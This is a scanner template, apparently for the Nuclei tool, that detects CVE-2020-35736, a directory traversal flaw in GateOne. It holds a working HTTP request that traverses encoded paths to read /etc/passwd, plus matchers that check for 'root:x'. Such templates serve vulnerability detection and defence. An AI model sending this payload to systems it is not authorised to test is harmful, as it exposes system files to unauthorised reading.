id: cve-2020-35736

info:
  name: Gateone Arbitrary File Read
  author: ProjectDiscoveryAI
  severity: medium
  tags: directory-traversal
  reference:
    - http://cve.scap.org.cn/vuln/VHN-379349
    - https://github.com/liftoff/GateOne/issues/747
  classification:
    cvss-metrics: 5.0
    cve-id: CVE-2020-35736
  description: |
    The vulnerability allows unauthorized downloading of arbitrary files, which can traverse the directory and read arbitrary files on the target system.

http:
  - raw:
      - |
        GET /downloads/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "root:x"
